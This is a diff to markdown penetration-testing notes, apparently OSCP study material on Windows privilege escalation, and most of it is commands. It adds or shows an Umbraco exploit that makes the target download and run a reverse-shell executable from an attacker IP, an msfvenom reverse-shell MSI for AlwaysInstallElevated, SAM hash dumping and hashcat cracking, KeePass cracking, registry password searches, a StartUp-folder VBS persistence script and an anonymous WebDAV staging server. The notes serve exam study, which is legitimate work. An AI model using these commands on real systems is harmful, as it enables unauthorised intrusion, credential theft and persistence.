@@ -957,22 +957,28 @@ net user <newusername> password123!
 net localgroup <groupname> <username> /add
 ```
 
-
 ### Cross Compiling
 ```bash
 ### compile C code to a 64- bit application
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 ```
 
+
 ### exiftool
 ```bash
 exiftool WElcomeLetter.pdf
 ```
 
-### keepass
+### keepass cracking
 ```bash
 keepass2john Database.kdbx > keepass.hash
 hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force 
+```
+
+### KPCLI to use kdbx
+```bash
+sudo apt install kpcli
+kpcli --kdb=Database.kdbx
 ```
 
 
@@ -1080,6 +1086,15 @@ ls -l /etc/shadow
 openssl passwd 'passwd'
 ```
 
+### wsgi settings
+```bash
+pip3 install wsgidav
+mkdir /root/webdav
+locate wsgidav
+/usr/local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/webdav
+```
+
+
 
 
 ### Privesc: Umbraco 7.12.4 exploit
@@ -1101,6 +1116,10 @@ d-----        2/19/2020   3:11 PM                en-US
 $ python3 ./49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080 -c powershell.exe -a '-NoProfile -Command wget http://192.168.45.176/revshell7777.exe -Outfile C:/Users/Public/noraj.exe'
 $ python3 ./49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080 -c powershell.exe -a '-NoProfile -Command C:/Users/Public/noraj.exe'
 ```
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+## Windows Privesc
 
 ### Windows Privesc: PrintSpoofer
 ```bash
@@ -1234,22 +1253,32 @@ out of the “user” account and log in as the “admin” account first.
 ```
 
 ### Windows Privesc: AlwaysInstallElevated
+Warning:: These two keys must be set to 1 like in the screenshot
+![image](https://github.com/nuricheun/OSCP/assets/14031269/a88b9154-826f-4710-a538-e30ab9b496af)
+The “AlwaysInstallElevated” value must be set to 1 for both the local machine:
+HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+and the current user:
+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+
 ```bash
 1. Use winPEAS to see if both registry values are set:
 > .\winPEASany.exe quiet windowscreds
 2. Alternatively, verify the values manually:
-> reg query 
-HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-> reg query 
-HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 # Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
 # Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:
 > msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
-
 ```
 
 ### Windows Privesc: Searching the Registry for Passwords
+The following commands will search the registry for keys and values that conians "password"
+```bash
+> reg query HKLM /f password /t REG_SZ /s
+> reg query HKCU /f password /t REG_SZ /s
+```
+
 ```bash
 # Use winPEAS to check common password locations:
 > .\winPEASany.exe quiet filesinfo userinfo
@@ -1278,11 +1307,12 @@ winexe -U 'admin%password123' //192.168.1.22 cmd.exe
 ```
 
 ### Windows Privesc: Configuration Files
+![image](https://github.com/nuricheun/OSCP/assets/14031269/553903e8-9be9-4d6b-9105-8f1c9d994e46)
+
 ```bash
-### MUANL CHECK
-#Recursively search for files in the current directory with “pass” in the name, or ending in “.config”:
+## MUANL CHECK: Recursively search for files in the current directory with “pass” in the name, or ending in “.config”:
 > dir /s *pass* == *.config
-#Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:
+# Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:
 > findstr /si password *.xml *.ini *.txt
 
 ### With winPEAS
@@ -1295,26 +1325,56 @@ winexe -U 'admin%password123' //192.168.1.22 cmd.exe
 $ echo "cGFzc3dvcmQxMjM=" | base64 -d
 # Once again we can simply use winexe to spawn a shell as the admin user
 ```
+
 ### Windows Privesc: SAM
-```bash
+If you have the ability to read the SAM and SYSTEM Files, you can extract the hashes.
+The SAM and SYSTEM files are located in the C:\Windows\System32\config directory.(LOCKED)
+Backups of the files may exist in the c:\Windows\Repair or C:\Windows\System32\config\RegBack directory
+![image](https://github.com/nuricheun/OSCP/assets/14031269/abe1f46d-35f7-4d20-9a95-e718c73568f1)
 
+```bash
+# Download the latest version of the creddump suite:
+> git clone https://github.com/Neohapsis/creddump7.git
+# Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
+> python2 creddump7/pwdump.py SYSTEM SAM
+# Crack the admin user hash using hashcat:
+> hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
 ```
 
+### Windows Privesc: Scheduled Tasks
 
-###wsgi
 ```bash
-pip3 install wsgidav
-mkdir /root/webdav
-locate wsgidav
-/usr/local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/webdav
+> schtasks /query /fo LIST /v
+#In PowerShell:
+PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
 ```
 
-
-### KPCLI to use kdbx
+### Windows Privesc: Startup Apps
 ```bash
-sudo apt install kpcli
-kpcli --kdb=Database.kdbx
+Windows also has a startup directory for apps that should start for all users:
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+
+
+# Use accesschk.exe to check permissions on the StartUp directory:
+> .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+> cscript CreateShortcut.vbs
 ```
+
+```bash
+### CreateShortcut.vbs
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+oLink.Save
+```
+
+###  Windows Privesc: Installed Applications
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
 
 
 
